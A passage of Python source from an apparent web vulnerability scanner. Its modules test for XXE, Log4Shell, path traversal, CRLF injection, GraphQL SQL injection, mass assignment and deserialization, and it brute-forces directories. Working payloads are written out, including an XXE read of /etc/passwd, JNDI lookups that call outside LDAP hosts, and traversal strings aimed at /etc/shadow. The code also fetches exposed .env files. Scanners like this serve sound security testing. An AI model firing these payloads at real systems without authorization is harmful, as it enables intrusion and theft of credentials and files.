                    pollution_indicators = ['__proto__', 'constructor', 'toString',
                                            'polluted', 'injected', 'admin', 'isAdmin']
                    has_indicator = any(x in r.text for x in pollution_indicators)
                    status_changed = r.status_code != baseline_status
                    size_anomaly = abs(len(r.text) - baseline_len) > baseline_len * 0.5 if baseline_len > 0 else False
                    if (status_changed or size_anomaly) and has_indicator:
                        vulnscan['prototype_pollution'].append({'url': pp_url, 'param': param, 'evidence': f'Prototype pollution confirmed (status {r.status_code}, baseline {baseline_status})', 'payload': payload[:60]})
                        add_finding('medium', f'Prototype Pollution: {param}',
                            sub=f'Prototype pollution on ?{param}= - payload caused behavioral change',
                            asset=pp_url, cvss='6.5', owasp='A03', mitre='T1059',
                            details=f'Type: Prototype Pollution\nPayload: {payload}\nBaseline: {baseline_status}, After payload: {r.status_code}\nIndicators: {[x for x in pollution_indicators if x in r.text]}\nURL: {pp_url}\n\nRemediation: Use Map instead of plain objects. Freeze prototypes.')
                        log('warn', f'[VULNSCAN] CONFIRMED Prototype pollution on ?{param}=')
                        break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 15. GRAPHQL INJECTION TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing GraphQL endpoints...')
        graphql_paths = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql',
                         '/query', '/gql', '/_graphql']
        for gql_path in graphql_paths:
            if not scan_state.get('scanning'):
                break
            try:
                # Introspection query
                introspection = '{"query":"{__schema{types{name,fields{name}}}}"}'
                r, _ = timed_request(f'{base_url}{gql_path}', method='POST',
                                     data=introspection, extra_headers={'Content-Type': 'application/json'})
                if r and r.status_code == 200 and '__schema' in r.text:
                    vulnscan['graphql_injection'].append({'url': f'{base_url}{gql_path}', 'type': 'introspection', 'evidence': 'GraphQL introspection enabled'})
                    add_finding('medium', f'GraphQL Introspection Enabled: {gql_path}',
                        sub=f'GraphQL introspection query returned schema', asset=f'{base_url}{gql_path}',
                        cvss='5.3', owasp='A01', mitre='T1592',
                        details=f'Type: GraphQL Introspection\nEndpoint: {gql_path}\nIntrospection query returned full schema.\n\nRemediation: Disable introspection in production. Use persisted queries.')
                    log('warn', f'[VULNSCAN] GraphQL introspection at {gql_path}')

                # Test for injection via GraphQL
                sqli_gql = '{"query":"{ user(id: \\"1 OR 1=1\\") { name } }"}'
                r2, _ = timed_request(f'{base_url}{gql_path}', method='POST',
                                      data=sqli_gql, extra_headers={'Content-Type': 'application/json'})
                if r2:
                    for err in sqli_errors[:5]:
                        if err.lower() in r2.text.lower():
                            vulnscan['graphql_injection'].append({'url': f'{base_url}{gql_path}', 'type': 'sql-injection', 'evidence': f'SQL error: {err}'})
                            add_finding('critical', f'GraphQL SQL Injection: {gql_path}',
                                sub=f'SQL injection via GraphQL query', asset=f'{base_url}{gql_path}',
                                cvss='9.8', owasp='A03', mitre='T1190',
                                details=f'Type: GraphQL SQL Injection\nEndpoint: {gql_path}\nError: {err}')
                            log('err', f'[VULNSCAN] GraphQL SQLi at {gql_path}')
                            break
            except Exception:
                pass

        # ═══════════════════════════════════════════════════════════════════════
        # 16. JWT ATTACK TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing JWT vulnerabilities...')
        # Look for JWT tokens in cookies and headers
        try:
            r, _ = timed_request(base_url)
            if r:
                jwt_indicators = []
                # Check cookies for JWT
                for cookie in r.cookies:
                    cookie_val = cookie.value
                    if cookie_val.startswith('eyJ'):
                        jwt_indicators.append(('cookie', cookie.name, cookie_val[:50]))
                # Check for JWT in response body
                jwt_matches = re.findall(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', r.text)
                for jwt in jwt_matches[:3]:
                    jwt_indicators.append(('body', 'jwt', jwt[:50]))

                for source, name, token_preview in jwt_indicators:
                    # Try alg:none attack
                    try:
                        import base64 as b64
                        # Decode header
                        header_b64 = token_preview.split('.')[0] + '=='
                        try:
                            header_json = b64.urlsafe_b64decode(header_b64).decode()
                        except Exception:
                            header_json = '{}'
                        if 'alg' in header_json:
                            vulnscan['jwt_attacks'].append({'source': source, 'name': name, 'type': 'detected', 'header': header_json[:100]})
                            add_finding('info', f'JWT Token Detected: {name}',
                                sub=f'JWT found in {source}: {name}', asset=base_url,
                                owasp='A07', mitre='T1539',
                                details=f'Type: JWT Token Detected\nSource: {source}\nName: {name}\nHeader: {header_json[:200]}\n\nManual testing recommended: alg:none, key confusion, weak secret brute-force.')
                            log('ok', f'[VULNSCAN] JWT found in {source}: {name}')
                    except Exception:
                        pass
        except Exception:
            pass

        # ═══════════════════════════════════════════════════════════════════════
        # 17. XXE TESTING (Advanced)
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing XXE vectors...')
        xxe_endpoints = ['/api', '/api/v1', '/api/upload', '/upload', '/xml', '/soap', '/wsdl']
        for ep in xxe_endpoints:
            if not scan_state.get('scanning'):
                break
            xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
            try:
                r, _ = timed_request(f'{base_url}{ep}', method='POST', data=xxe_payload,
                                     extra_headers={'Content-Type': 'application/xml'})
                if r and ('root:' in r.text or 'daemon:' in r.text):
                    vulnscan['xxe_advanced'].append({'url': f'{base_url}{ep}', 'type': 'file-read', 'evidence': 'File content disclosed via XXE'})
                    add_finding('critical', f'XXE File Read: {ep}',
                        sub=f'XML External Entity injection at {ep}', asset=f'{base_url}{ep}',
                        cvss='9.1', exploit='PUBLIC', owasp='A05', mitre='T1203',
                        details=f'Type: XML External Entity (XXE)\nEndpoint: {ep}\nSuccessfully read /etc/passwd via XXE.\n\nRemediation: Disable external entity processing in XML parser. Use JSON instead of XML.')
                    log('err', f'[VULNSCAN] XXE at {ep}')
                    break
            except Exception:
                pass

        # ═══════════════════════════════════════════════════════════════════════
        # 18. LOG4SHELL DETECTION
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Log4Shell (CVE-2021-44228)...')
        log4j_payloads = [
            '${jndi:ldap://log4shell.scan/callback}',
            '${${lower:j}ndi:ldap://test.com/a}',
            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://test.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://test.com/a}',
            '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-://}test.com/a}',
            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1#test.com/a}',
        ]
        for param in test_params[:6]:
            if not scan_state.get('scanning'):
                break
            for payload in log4j_payloads[:3]:
                l4j_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(l4j_url, extra_headers={
                        'X-Api-Version': payload, 'User-Agent': payload,
                        'X-Forwarded-For': payload, 'Referer': payload,
                    })
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 19. HEADER INJECTION (CRLF)
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Header Injection...')
        for param in ['url', 'redirect', 'return', 'next', 'callback', 'redir']:
            if not scan_state.get('scanning'):
                break
            hi_payloads = [
                'test%0d%0aInjected-Header: malicious',
                'test%0d%0a%0d%0a<script>alert(1)</script>',
                'test\r\nInjected-Header: malicious',
                'test\nInjected-Header: malicious',
            ]
            for payload in hi_payloads[:2]:
                hi_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(hi_url)
                    if r and ('Injected-Header' in r.headers or 'malicious' in str(r.headers)):
                        vulnscan['header_injection'].append({'url': hi_url, 'param': param, 'evidence': 'Header injection confirmed'})
                        add_finding('high', f'HTTP Header Injection: {param}',
                            sub=f'CRLF injection on ?{param}=', asset=hi_url,
                            cvss='6.1', exploit='PUBLIC', owasp='A03', mitre='T1190',
                            details=f'Type: CRLF / Header Injection\nPayload: {payload}\nInjected header was reflected.\nURL: {hi_url}\n\nRemediation: Sanitize all CRLF characters from user input used in headers.')
                        log('err', f'[VULNSCAN] Header Injection on ?{param}=')
                        break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 20. MASS ASSIGNMENT TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Mass Assignment...')
        for ep in ['/api/user', '/api/profile', '/api/account', '/api/register', '/api/signup']:
            if not scan_state.get('scanning'):
                break
            for field in mass_assignment_fields[:5]:
                try:
                    data = {'username': 'testuser', field: 'true'}
                    r, _ = timed_request(f'{base_url}{ep}', method='POST', data=data,
                                         extra_headers={'Content-Type': 'application/json'})
                    if r and r.status_code in (200, 201):
                        vulnscan['mass_assignment'].append({'url': f'{base_url}{ep}', 'field': field, 'evidence': f'Accepted {field} field'})
                        add_finding('high', f'Mass Assignment: {ep}',
                            sub=f'Field "{field}" accepted without validation', asset=f'{base_url}{ep}',
                            cvss='7.5', owasp='A04', mitre='T1098',
                            details=f'Type: Mass Assignment\nEndpoint: {ep}\nField: {field}\nThe API accepted privileged field without validation.\n\nRemediation: Use allowlists for accepted fields. Never bind raw user input to models.')
                        log('err', f'[VULNSCAN] Mass assignment: {field} at {ep}')
                        break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 21. DESERIALIZATION TESTING
        # Requires: response must show deserialization-specific errors or
        # the endpoint must explicitly accept the content type
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Deserialization...')
        deser_endpoints = ['/api/import', '/api/upload', '/api/data', '/api/object', '/api/restore']
        for ep in deser_endpoints:
            if not scan_state.get('scanning'):
                break
            # Java serialized object header
            java_payload = b'\xac\xed\x00\x05'
            try:
                # Get baseline first
                baseline_r, _ = timed_request(f'{base_url}{ep}', method='POST', data=b'normal',
                                              extra_headers={'Content-Type': 'application/json'})
                baseline_status = baseline_r.status_code if baseline_r else 0
                baseline_len = len(baseline_r.text) if baseline_r else 0

                r, _ = timed_request(f'{base_url}{ep}', method='POST', data=java_payload,
                                     extra_headers={'Content-Type': 'application/x-java-serialized-object'})
                if r:
                    # Require proof of deserialization:
                    # 1. Deserialization-specific error messages in response
                    deser_errors = ['ClassNotFoundException', 'InvalidClassException',
                                    'StreamCorruptedException', 'OptionalDataException',
                                    'NotSerializableException', 'java.io.ObjectInputStream',
                                    'java.lang.ClassNotFoundException', 'deserializ',
                                    'marshal', 'unmarshal', 'ObjectInputStream']
                    has_deser_error = any(e.lower() in r.text.lower() for e in deser_errors)
                    # 2. Response is significantly different from baseline (not just normal processing)
                    size_diff = abs(len(r.text) - baseline_len) if baseline_len > 0 else 0
                    status_diff = r.status_code != baseline_status
                    # 3. Response contains Java-specific stack traces
                    java_stack = 'java.' in r.text.lower() or 'javax.' in r.text.lower()
                    if has_deser_error or java_stack or (status_diff and size_diff > 500):
                        vulnscan['deserialization'].append({'url': f'{base_url}{ep}', 'type': 'java', 'evidence': f'Deserialization confirmed (errors: {has_deser_error}, stack: {java_stack}, diff: {size_diff})'})
                        add_finding('high', f'Insecure Deserialization: {ep}',
                            sub=f'Java deserialization confirmed at {ep} - deserialization errors detected',
                            asset=f'{base_url}{ep}', cvss='8.0', owasp='A08', mitre='T1059',
                            details=f'Type: Insecure Deserialization\nEndpoint: {ep}\nDeserialization errors: {has_deser_error}\nJava stack traces: {java_stack}\nBaseline status: {baseline_status}, After payload: {r.status_code}\nResponse size diff: {size_diff} bytes\n\nRemediation: Never deserialize untrusted data. Use safe serialization formats (JSON).')
                        log('err', f'[VULNSCAN] Deserialization confirmed at {ep}')
                    else:
                        log('info', f'[VULNSCAN] {ep} accepted payload but no deserialization proof found')
            except Exception:
                pass

    except Exception as e:
        log('warn', f'[VULNSCAN] Scan error: {e}')

    total = sum(len(v) for v in vulnscan.values())
    categories = [k for k, v in vulnscan.items() if v]
    log('ok', f'[VULNSCAN] Found {total} potential vulnerabilities across {len(categories)} categories')
    with LOCK:
        scan_state['vulnscan_data'] = vulnscan
    set_progress('vulnscan', 100)

# ─── SQLMAP INTEGRATION MODULE ────────────────────────────────────────────────


def run_feroxbuster(target, wordlist, depth=3):
    """Run feroxbuster for recursive directory bruteforce. Returns list of discovered URLs."""
    ferox_path = _find_tool('feroxbuster')
    if not ferox_path:
        return []

    log('info', f'[DIRS] Running feroxbuster (depth={depth})')
    output_file = f'/tmp/ferox_{target.replace(".", "_")}.json'

    try:
        cmd = [
            ferox_path,
            '-u', f'https://{target}',
            '-w', wordlist,
            '-d', str(depth),
            '-o', output_file,
            '-of', 'json',
            '-t', '20',
            '--timeout', '10',
            '-s', '200,301,302,401,403',
            '-q',
        ]

        stdout, stderr, rc = _run_tool(cmd, timeout=180)

        if rc == 0 and os.path.isfile(output_file):
            with open(output_file, 'r') as f:
                data = json.load(f)
            urls = []
            for result in data.get('results', []):
                url = result.get('url', '')
                status = result.get('status', 0)
                if url and status in (200, 301, 302, 401, 403):
                    urls.append(url)
            log('ok', f'[DIRS] feroxbuster found {len(urls)} URLs')
            return urls
    except Exception as e:
        log('warn', f'[DIRS] feroxbuster error: {e}')
    finally:
        try:
            os.remove(output_file)
        except Exception:
            pass

    return []


def run_directory_module(target):
    log('info', f'[DIRS] Brute-forcing directories on {target}')
    dir_data = []
    ffuf_path = _find_tool('ffuf')
    if ffuf_path:
        log('info', f'[DIR] Running ffuf for enhanced directory discovery')
        wordlist = '/usr/share/wordlists/dirb/common.txt'
        if not os.path.isfile(wordlist):
            wordlist = '/usr/share/dirb/wordlists/common.txt'
        if os.path.isfile(wordlist):
            adv = scan_state.get('advanced_options', {})
            ffuf_threads = adv.get('ffuf_threads', 20)
            tool_timeout = adv.get('timeout', 45)
            stdout, stderr, rc = _run_tool([
                ffuf_path, '-u', f'https://{target}/FUZZ',
                '-w', wordlist, '-mc', '200,204,301,302,307,401,403',
                '-o', '/dev/stdout', '-of', 'json', '-t', str(ffuf_threads), '-timeout', '10'
            ], timeout=tool_timeout)
            if rc == 0 and stdout:
                try:
                    import json as _json
                    ffuf_data = _json.loads(stdout)
                    with LOCK:
                        for result in ffuf_data.get('results', []):
                            path = result.get('input', {}).get('FUZZ', '')
                            status = result.get('status', 0)
                            size = result.get('length', 0)
                            scan_state['dir_data'].append({
                                'path': f'/{path}', 'status': status,
                                'size': size, 'source': 'ffuf'
                            })
                    log('ok', f'[DIR] ffuf found {len(ffuf_data.get("results", []))} paths')
                except Exception as e:
                    log('warn', f'[DIR] ffuf parse error: {e}')
        else:
            log('warn', f'[DIR] Wordlist not found, skipping ffuf')
    
    # ═══════════════════════════════════════════════════════════════════════════
    # ENHANCE: Use discovered paths from Phase 1 to focus brute-force efforts
    # ═══════════════════════════════════════════════════════════════════════════
    with LOCK:
        discovery = dict(scan_state.get('discovery_data', {}))
    discovered_urls = discovery.get('urls', [])
    # Extract paths from discovered URLs for targeted directory testing
    discovered_paths = []
    for url in discovered_urls:
        if isinstance(url, str):
            path = urlparse(url).path if url.startswith('http') else url
            if path and path != '/' and path not in discovered_paths:
                discovered_paths.append(path)
        elif isinstance(url, dict):
            path = url.get('path', urlparse(url.get('url', '')).path)
            if path and path != '/' and path not in discovered_paths:
                discovered_paths.append(path)
    
    # Add discovered paths to the wordlist for targeted testing
    COMMON_DIRS = [
        'admin', 'login', 'panel', 'dashboard', 'api', 'api/v1', 'api/v2',
        'uploads', 'upload', 'files', 'assets', 'static', 'images', 'img',
        'css', 'js', 'scripts', 'backup', 'backups', 'bak', 'old', 'temp',
        'tmp', 'test', 'tests', 'dev', 'staging', 'debug', 'config',
        'configs', 'setup', 'install', 'database', 'db', 'sql', 'mysql',
        'phpmyadmin', 'pma', 'adminer', 'wp-admin', 'wp-login', 'wp-content',
        'cgi-bin', 'bin', 'lib', 'vendor', 'node_modules', 'package',
        '.git', '.env', '.htaccess', '.htpasswd', '.svn', '.DS_Store',
        'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
        'web.config', 'elmah.axd', 'trace.axd', 'server-status', 'server-info',
        'info.php', 'phpinfo.php', 'test.php', 'readme.html', 'README.md',
        'changelog.html', 'LICENSE', 'CONTRIBUTING.md',
        'wp-json', 'wp-json/wp/v2/users', 'xmlrpc.php',
        'feed', 'rss', 'atom.xml', 'comments/feed',
        'user', 'users', 'account', 'accounts', 'profile', 'register',
        'signup', 'signin', 'auth', 'oauth', 'token',
        'search', 'query', 'find', 'filter', 'sort',
        'filemanager', 'elfinder', 'ckfinder', 'tinymce', 'ckeditor',
        'mail', 'webmail', 'email', 'smtp', 'imap',
        'calendar', 'event', 'events', 'booking', 'reservation',
        'shop', 'store', 'cart', 'checkout', 'payment', 'order', 'orders',
        'blog', 'post', 'posts', 'article', 'articles', 'news',
        'forum', 'thread', 'topic', 'discussion', 'comment', 'comments',
        'gallery', 'photo', 'photos', 'image', 'images', 'video', 'videos',
        'download', 'downloads', 'media', 'files', 'documents', 'docs',
        'help', 'support', 'faq', 'contact', 'about', 'terms', 'privacy',
        'status', 'health', 'ping', 'version', 'info', 'system',
        'cron', 'jobs', 'queue', 'worker', 'task', 'tasks', 'jobs',
        'log', 'logs', 'audit', 'report', 'reports',
        'swagger', 'swagger-ui', 'api-docs', 'openapi', 'graphiql',
    ]
    target_wordlist = list(COMMON_DIRS)
    if discovered_paths:
        for p in discovered_paths:
            parts = [x for x in p.split('/') if x]
            for i in range(1, len(parts)+1):
                dir_path = '/' + '/'.join(parts[:i])
                if dir_path not in target_wordlist:
                    target_wordlist.append(dir_path)
        log('info', f'[DIRS] Added {len(discovered_paths)} discovered paths for targeted testing')
    
    # ═══ SMART WORDLIST: Add technology-specific paths ═══
    with LOCK:
        tech_data_dir = scan_state.get('discovery_data', {}).get('technologies', {})
    if isinstance(tech_data_dir, dict):
        tech_list = tech_data_dir.get('technologies', [])
        tech_names_dir = [t.get('name', '') for t in tech_list if isinstance(t, dict)]
    else:
        tech_names_dir = []
    # Technology-specific path suggestions
    TECH_PATHS = {
        'WordPress': ['/wp-admin', '/wp-login.php', '/wp-content/uploads', '/wp-json', '/xmlrpc.php', '/wp-includes'],
        'Joomla': ['/administrator', '/components', '/modules', '/plugins', '/templates'],
        'Drupal': ['/user/login', '/admin/content', '/node', '/sites/default/files'],
        'Laravel': ['/storage/logs', '/storage/framework', '/.env', '/public'],
        'Django': ['/admin', '/static', '/media', '/accounts/login'],
        'Spring': ['/actuator', '/actuator/health', '/swagger-ui.html', '/api-docs'],
        'PHP': ['/phpinfo.php', '/info.php', '/.htaccess', '/config.php'],
        'Apache': ['/server-status', '/server-info', '/.htaccess'],
        'Nginx': ['/nginx_status', '/stub_status'],
        'Express': ['/api', '/health', '/swagger'],
        'Tomcat': ['/manager', '/host-manager', '/manager/html'],
        'IIS': ['/web.config', '/elmah.axd', '/trace.axd'],
    }
    smart_paths = []
    for tech in tech_names_dir:
        for key, paths in TECH_PATHS.items():
            if key.lower() in tech.lower():
                smart_paths.extend(paths)
    for p in smart_paths:
        if p not in target_wordlist:
            target_wordlist.append(p)
    if len(smart_paths) > 5:
        log('info', f'[DIRS] Added {len(smart_paths)} tech-specific paths (smart wordlist)')
    
    try:
        if REQUESTS_AVAILABLE:
            with ThreadPoolExecutor(max_workers=10) as executor:
                def check_path(path):
                    if not scan_state.get('scanning'):
                        return None
                    for proto in ('https', 'http'):
                        url = f'{proto}://{target}/{path}'
                        try:
                            r = req_lib.get(url, timeout=5, verify=False, allow_redirects=False)
                            if r.status_code in (200, 301, 302, 401, 403, 500):
                                log('ok', f'[DIRS] {url} -> {r.status_code}')
                                return {'path': f'/{path}', 'status': r.status_code, 'size': len(r.content)}
                        except Exception:
                            pass
                    return None
                futures = [executor.submit(check_path, w) for w in target_wordlist]
                try:
                    for f in as_completed(futures, timeout=120):
                        try:
                            result = f.result(timeout=5)
                            if result:
                                dir_data.append(result)
                        except Exception:
                            pass
                except TimeoutError:
                    for f in futures:
                        f.cancel()
            dir_data.sort(key=lambda x: x['path'])
            log('ok', f'[DIRS] Found {len(dir_data)} accessible paths')
            for d in dir_data:
                if d['status'] == 200 and d['path'] in ('/.git', '/.env', '/backup', '/admin'):
                    # Build real evidence from the response itself
                    evidence = (
                        f'Sensitive path accessible at: https://{target}{d["path"]}\n'
                        f'HTTP status: {d["status"]} | Response size: {d["size"]} bytes'
                    )
                    # For .env found here, parse body if available
                    if d['path'] == '/.env' and d['size'] > 0 and d['size'] < 100000:
                        try:
                            content = req_lib.get(f'https://{target}/.env', timeout=5, verify=False).text
                            env_lines = []
                            for line in content.splitlines()[:30]:
                                line = line.strip()
                                if line and not line.startswith('#') and '=' in line:
                                    k, _, v = line.partition('=')
                                    k = k.strip()
                                    v = v.strip().strip('"').strip("'")
                                    if re.match(r'^[A-Za-z_][A-Za-z0-9_]*$', k):
                                        red = (v[:4] + '…' + v[-2:]) if len(v) > 8 else '••••'
                                        env_lines.append(f'  - {k} = {red}')
                            if env_lines:
                                evidence += '\nVariables parsed (values redacted):\n' + '\n'.join(env_lines)
                        except Exception:
                            pass
                    add_finding('critical', f'Sensitive path exposed: {d["path"]}',
                        sub=f'Accessible resource at {d["path"]} ({d["size"]} bytes)',
                        asset=f'{target}{d["path"]}', cvss='8.0', exploit='PUBLIC', owasp='A01', mitre='T1595',
                        details=evidence)
        else:
            log('warn', '[DIRS] requests library not available')
    except Exception as e:
        log('err', f'[DIRS] Error: {e}')

    # ── Feroxbuster: recursive depth-3 directory bruteforce ──
    ferox_path = _find_tool('feroxbuster')
    if ferox_path:
        wordlist = '/usr/share/wordlists/dirb/common.txt'
        if not os.path.isfile(wordlist):
            wordlist = '/usr/share/dirb/wordlists/common.txt'
        if os.path.isfile(wordlist):
            ferox_urls = run_feroxbuster(target, wordlist)
            if ferox_urls:
                with LOCK:
                    for u in ferox_urls:
                        from urllib.parse import urlparse as _urlparse
                        parsed = _urlparse(u)
                        dir_data.append({'path': parsed.path, 'status': 200, 'size': 0, 'source': 'feroxbuster'})
                log('ok', f'[DIRS] feroxbuster found {len(ferox_urls)} additional URLs')

    with LOCK:
        scan_state['dir_data'] = dir_data
    set_progress('dirs', 100)

# ─── JS ENDPOINT EXTRACTION MODULE ─────────────────────────────────────────────


def run_dir_traversal_module(target):
    """Test for directory/path traversal vulnerabilities."""
    log('info', f'[DIR-TRAVERSAL] Testing path traversal on {target}')
    base_url = f'https://{target}'
    traversal_findings = []

    # Discovery-driven: use discovered URLs/parameters
    with LOCK:
        disc = scan_state.get('discovery_data', {})
        target_urls = disc.get('urls', [])[:20]
        target_params = disc.get('parameters', [])

    traversal_payloads = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..\\..\\..\\etc\\passwd',
        '....//....//....//etc/shadow',
        '../../../etc/hosts',
        '..%252f..%252f..%252fetc/passwd',
        '../../../../proc/self/environ',
        '....//....//....//proc/self/environ',
    ]

    traversal_markers = [
        'root:x:0:0', 'root:!:0:0', 'daemon:x:', 'bin:x:',
        '127.0.0.1', 'localhost', 'ENV=',
        'root:x:0:0:/root:/bin/bash',
    ]

    # Test discovered URLs with parameters
    for url in target_urls[:10]:
        if not scan_state.get('scanning'):
            break
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            if not scan_state.get('scanning'):
                break
            for payload in traversal_payloads[:5]:
                try:
                    test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    test_params[param] = payload
                    test_url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'
                    r = req_lib.get(test_url, params=test_params, timeout=8, verify=False)
                    if any(marker in r.text for marker in traversal_markers):
                        add_finding(
                            'critical',
                            f'Directory traversal via {param} parameter',
                            sub=f'Parameter {param} allows reading server files',
                            asset=url, cvss='9.8', owasp='A01', mitre='T1083',
                            details=f'Parameter: {param}\nPayload: {payload}\n'
                                    f'Evidence: File contents returned in response\n'
                                    f'Confirmed: Root file system accessible')
                        traversal_findings.append({'param': param, 'payload': payload})
                        log('ok', f'[DIR-TRAVERSAL] Confirmed traversal via {param} on {parsed.path}')
                        break
                except Exception:
                    pass

    # Test discovered form parameters
    with LOCK:
        forms = disc.get('forms', [])
    for form in forms[:5]:
        if not scan_state.get('scanning'):
            break
        form_action = form.get('action', '')
        if not form_action:
            continue
        form_url = form_action if form_action.startswith('http') else f'{base_url}{form_action}'
        for payload in traversal_payloads[:3]:
            try:
                form_data = {}
                for inp in form.get('inputs', []):
                    name = inp.get('name', '')
                    if name:
                        form_data[name] = payload
                if form_data:
                    r = req_lib.post(form_url, data=form_data, timeout=8, verify=False)
                    if any(marker in r.text for marker in traversal_markers):
                        add_finding(
                            'critical',
                            f'Directory traversal via form submission to {urlparse(form_url).path}',
                            sub='Form input allows file system access',
                            asset=form_url, cvss='9.8', owasp='A01', mitre='T1083',
                            details=f'Form: {form_url}\nPayload: {payload}\n'
                                    f'Evidence: Server file contents in response')
                        traversal_findings.append({'form': form_url, 'payload': payload})
                        log('ok', f'[DIR-TRAVERSAL] Confirmed traversal via form {form_url}')
                        break
            except Exception:
                pass

    log('ok', f'[DIR-TRAVERSAL] Scan complete — {len(traversal_findings)} traversal findings')
    set_progress('dir_traversal', 100)


# ─── XSS HELPER FUNCTIONS ─────────────────────────────────────────────────────

def _analyze_xss_context(response_text, marker):
    """Analyze where in the HTML a reflected marker appears.
    
    Returns dict with:
      - location: 'html_body', 'attribute', 'javascript', 'url_attribute', 'style', 'comment'
      - tag: HTML tag name if inside a tag
      - attribute: attribute name if inside an attribute
      - encoding: detected encoding (none, html_entities, url_encoding, mixed)
    """
    result = {'location': 'html_body', 'tag': '', 'attribute': '', 'encoding': 'none'}

    # Check if marker is HTML-encoded
    if '&lt;' in response_text or '&gt;' in response_text or '&amp;' in response_text:
        if f'&lt;{marker}&gt;' in response_text or marker.replace('<', '&lt;') in response_text:
            result['encoding'] = 'html_entities'

    # Find the exact position of marker in response
    idx = response_text.find(marker)
    if idx == -1:
        return result

    # Extract surrounding context (500 chars before and after)
    start = max(0, idx - 500)
    end = min(len(response_text), idx + len(marker) + 500)
    before = response_text[start:idx]
    after = response_text[idx + len(marker):end]

    # Check if inside a <script> block
    script_start = response_text.rfind('<script', 0, idx)
    script_end = response_text.rfind('</script>', 0, idx)
    in_script = script_start > script_end

    if in_script:
        result['location'] = 'javascript'
        # Find which function/block
        return result

    # Check if inside an HTML attribute by counting quotes
    last_open_tag = response_text.rfind('<', 0, idx)
    if last_open_tag >= 0:
        tag_text = response_text[last_open_tag:idx]
        # Extract tag name
        tag_match = re.match(r'<(\w+)', tag_text)
        if tag_match:
            result['tag'] = tag_match.group(1).lower()

        # Count unescaped quotes before marker
        quote_count = tag_text.count('"') - tag_text.count('\\"')
        single_quote_count = tag_text.count("'") - tag_text.count("\\'")

        if quote_count % 2 == 1 or single_quote_count % 2 == 1:
            # Inside an attribute
            # Find which attribute
            attr_match = re.findall(r'(\w+)=["\']', tag_text)
            if attr_match:
                result['attribute'] = attr_match[-1]
                attr_name = attr_match[-1].lower()

                # Check if it's a URL attribute (href, src, action, etc.)
                URL_ATTRS = ['href', 'src', 'action', 'data', 'formaction', 'xlink:href',
                             'poster', 'background', 'dynsrc', 'lowsrc']
                if attr_name in URL_ATTRS:
                    result['location'] = 'url_attribute'
                elif attr_name.startswith('on'):
                    result['location'] = 'event_handler'
                else:
                    result['location'] = 'attribute'
            else:
                result['location'] = 'attribute'

    # Check if inside HTML comments
    comment_open = response_text.rfind('<!--', 0, idx)
    comment_close = response_text.rfind('-->', 0, idx)
    if comment_open > comment_close:
        result['location'] = 'comment'

    # Check if inside <style> or CSS
    style_open = response_text.rfind('<style', 0, idx)
    style_close = response_text.rfind('</style>', 0, idx)
    if style_open > style_close:
        result['location'] = 'style'

    return result


class ParamDiscovery:
    """Discover hidden parameters from HTML forms and JavaScript files."""

    # Common hidden parameter names found in JS/HTML
    COMMON_HIDDEN = [
        'debug', 'admin', 'test', 'dev', 'mode', 'type', 'action',
        'format', 'output', 'callback', 'jsonp', 'cb', 'token',
        'apikey', 'api_key', 'key', 'secret', 'auth', 'session',
        'user_id', 'uid', 'id', 'ref', 'source', 'page',
        'limit', 'offset', 'sort', 'order', 'filter', 'lang', 'locale',
        'version', 'v', 't', 'ts', 'timestamp', 'nonce', 'sign',
        'signature', 'hash', 'hmac', 'redirect', 'return', 'next',
        'url', 'uri', 'path', 'file', 'name', 'email', 'phone',
    ]

    @staticmethod
    def from_html(html_text):
        """Extract hidden parameter names from HTML forms."""
        params = set()
        if not html_text:
            return params

        # Find all hidden input fields
        hidden_inputs = re.findall(
            r'<input[^>]+type=["\']hidden["\'][^>]*>', html_text, re.I | re.S
        )
        for inp in hidden_inputs:
            name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
            if name_match:
                params.add(name_match.group(1))

        # Find all form inputs (names suggest parameters)
        all_inputs = re.findall(
            r'<input[^>]+name=["\']([^"\']+)["\']', html_text, re.I
        )
        params.update(all_inputs)

        # Find select elements
        selects = re.findall(
            r'<select[^>]+name=["\']([^"\']+)["\']', html_text, re.I
        )
        params.update(selects)

        # Find textarea elements
        textareas = re.findall(
            r'<textarea[^>]+name=["\']([^"\']+)["\']', html_text, re.I
        )
        params.update(textareas)

        # Find JS variables that look like parameters
        js_params = re.findall(
            r'(?:var|let|const)\s+(\w+)\s*=\s*["\'][^"\']*["\']', html_text
        )
        for p in js_params:
            if p.lower() in [x.lower() for x in ParamDiscovery.COMMON_HIDDEN]:
                params.add(p)

        # Find URL query parameters in JavaScript
        url_params = re.findall(
            r'[?&](\w+)=', html_text
        )
        for p in url_params:
